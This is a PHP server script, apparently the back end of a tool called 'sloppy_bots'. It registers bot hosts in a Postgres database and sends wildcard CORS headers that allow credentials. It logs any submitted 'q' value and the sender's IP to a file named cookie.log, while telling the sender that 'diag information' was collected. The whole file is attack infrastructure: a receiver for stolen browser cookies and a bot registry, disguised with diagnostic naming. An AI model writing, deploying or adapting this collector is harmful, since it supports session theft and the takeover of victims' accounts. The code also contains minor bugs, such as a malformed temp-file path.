<?php
# Obviously this will change depending on what your database information is. but this will append new 'bots'
# to the db so you can reference them with the client script.
define('DBCONN', pg_connect("host=127.0.0.1 port=5432 user=sloppy_main dbname=sloppy_bots"));

function fresh_deploy(){
    require_once "includes/db/postgres_checker.php";
    try {
        # place this file in a writable directory, im going with /tmp/ for now.
        # this will only be called if the deployment is fresh. and if this file is still located in /tmp/
        $fp = fopen("/tmp/diag_php.pid", "a");
        if (empty(fread($fp, 1))){
            $rRun = new postgres_checker();
            if ($rRun->checkDB() != false){
                echo("DB is running, executing a create db function.");
                if ($rRun->createDB() != false) {
                    fwrite($fp, "running");
                    fclose($fp);
                }else{
                    echo("CRITICAL, I CANNOT CONTINUE, THE DB WAS NOT CREATED, ANY NEW HOSTS WILL NOT BE SAVED.");
                }
            }

        }
    }catch (Exception $ee){

    }
}

function addNewHost($rhost, $uri, $action){
    if (!empty($rhost) && !empty($uri) && !empty($action)){
        if (strtolower($action) === 'add') {
            $prep = sprintf("INSERT INTO sloppy_bots(host, uri) VALUES ('%s', '%s')", pg_escape_string($rhost), pg_escape_string($uri));
            pg_exec(DBCONN, $prep);
        }else{
            http_response_code('444');
        }
    }
}


if (!file_exists(sys_get_temp_dir()."diag_php.pid")){
    fresh_deploy();
}


if (!empty($_SERVER["REQUEST_METHOD"])) {
    $outLog = './lots/cookie.log';
    echo "Diag information collected!";
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Credentials: true");
    if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    }else {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: ".$_SERVER["REMOTE_ADDR"]."\nContents: ".$req_dump."\n", FILE_APPEND);
            http_response_code(200);
        }
    }
}
